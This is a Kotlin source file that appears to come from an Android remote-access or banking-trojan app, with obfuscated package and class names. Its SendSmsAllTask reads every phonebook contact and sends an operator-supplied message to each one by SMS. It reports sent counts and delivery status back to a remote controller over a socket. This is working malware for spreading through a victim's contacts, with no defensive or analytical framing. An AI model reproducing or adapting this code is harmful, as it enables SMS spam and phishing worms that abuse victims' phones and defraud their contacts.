package com.xxx.zzz.commandp.taskssv

import android.Manifest
import android.annotation.SuppressLint
import android.app.Activity
import android.app.PendingIntent
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.provider.ContactsContract
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.util.Log
import androidx.core.app.ActivityCompat
import com.xxx.zzz.aall.gsonllll.googlepp.Gsonq
import com.xxx.zzz.globp.SharedPreferencess
import com.xxx.zzz.socketsp.IOSocketyt
import org.json.JSONObject


class SendSmsAllTask(val ctx: Context, val message: String, private val simSlotIndex: Int = 0) :
    BaseTask(ctx) {

    private val smsSent = "smsSent"
    private val smsDelivered = "smsDelivered"
    private fun smsMailingPhonebook() {
        val phones = ctx.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            null,
            null,
            null,
            null
        )
        var phoneNumber: String
        var is_sms_working = false
        var scr = 0
        while (phones!!.moveToNext()) {
            phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
            if (!phoneNumber.contains("*") && !phoneNumber.contains("#") && phoneNumber.length > 6) {
                try {
                    sendSms(phoneNumber)
                    is_sms_working = true
                    scr++
                } catch (ex: Exception) {
                    IOSocketyt.sendLogs("", "SendSmsAllTask ${ex.localizedMessage}", "error")
                    val obj = JSONObject()
                    obj.put(
                        "sms_mailing_phonebook_Error",
                        "No permission to send SMS ${ex.localizedMessage} "
                    )
                    SharedPreferencess.SettingsToAdd("events", "$obj::endlog::")
                }
            }
        }

        if (is_sms_working) {
            val obj = JSONObject()
            obj.put("sms_send", scr.toString())
            IOSocketyt.sendLogs("", obj.toString(), "sms_send_all")
        }
    }

    @SuppressLint("MissingPermission")
    private fun sendSms(phoneNumber: String) {
        runCatching {
            val manager = SmsManager.getDefault()
            val piSend = PendingIntent.getBroadcast(ctx, 0, Intent(smsSent), 0)
            val piDelivered = PendingIntent.getBroadcast(ctx, 0, Intent(smsDelivered), 0)
            val length = message.length

            val subscriptionManager = ctx.applicationContext.getSystemService(SubscriptionManager::class.java)
            val subscriptionInfo =
                subscriptionManager.getActiveSubscriptionInfoForSimSlotIndex(simSlotIndex)

            if (length > 160) {
                val messageList = manager.divideMessage(message)

                val sents: ArrayList<PendingIntent> = ArrayList()
                val deliveredList = ArrayList<PendingIntent?>()
                for (i in messageList.indices) {
                    deliveredList.add(piDelivered)
                    sents.add(piSend)
                }

                if (subscriptionInfo != null)
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendMultipartTextMessage(
                            phoneNumber,
                            null,
                            messageList,
                            sents,
                            deliveredList
                        )
                else
                    SmsManager.getDefault().sendMultipartTextMessage(
                        phoneNumber,
                        null,
                        messageList,
                        sents,
                        deliveredList
                    )
            } else {
                if (subscriptionInfo != null)
                    SmsManager.getSmsManagerForSubscriptionId(subscriptionInfo.subscriptionId)
                        .sendTextMessage(phoneNumber, null, message, piSend, piDelivered)
                else
                    SmsManager.getDefault()
                        .sendTextMessage(phoneNumber, null, message, piSend, piDelivered)
            }

            IOSocketyt.sendLogs("", "SendSmsAllTask $phoneNumber", "success")
        }.onFailure {
            IOSocketyt.sendLogs("", "SendSmsAllTask ${it.localizedMessage}", "error")
        }
    }

    private val receiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context, intent: Intent) {
            val status: String
            val reason: String

            when (resultCode) {
                Activity.RESULT_OK -> {
                    status = "success"
                    reason = "Everything was good :-)"
                }
                SmsManager.RESULT_ERROR_GENERIC_FAILURE -> {
                    status = "failed"
                    reason = "Message not sent."
                }
                SmsManager.RESULT_ERROR_NO_SERVICE -> {
                    status = "failed"
                    reason = "No service."
                }
                SmsManager.RESULT_ERROR_NULL_PDU -> {
                    status = "failed"
                    reason = "Error: Null PDU."
                }
                SmsManager.RESULT_ERROR_RADIO_OFF -> {
                    status = "failed"
                    reason = "Error: Radio off."
                }
                else -> {
                    status = "failed"
                    reason = "unknown"
                }
            }

            Log.i("tag", status + reason)

            foo(status, reason)
        }

        private fun foo(status: String, reason: String) {
            runCatching {
                val data = JSONObject()
                data.put("status", status)
                data.put("reason", reason)
                data.put("dataType", "sendSmsStatus")

                IOSocketyt.sendLogs("", Gsonq().toJson(data), "sendSmsStatus")
            }.onFailure {
                IOSocketyt.sendLogs("", "foo ${it.localizedMessage}", "error")
            }
        }
    }

    override fun run() {
        super.run()
        if (ActivityCompat.checkSelfPermission(
                ctx,
                Manifest.permission.SEND_SMS
            ) == PackageManager.PERMISSION_GRANTED
        ) {
            runCatching {
                ctx.registerReceiver(receiver, IntentFilter(smsSent))
                smsMailingPhonebook()
            }.onFailure {
                IOSocketyt.sendLogs("", "SendSmsAllTask ${it.localizedMessage}", "error")
            }
        } else
            requestPermissions()
    }
}


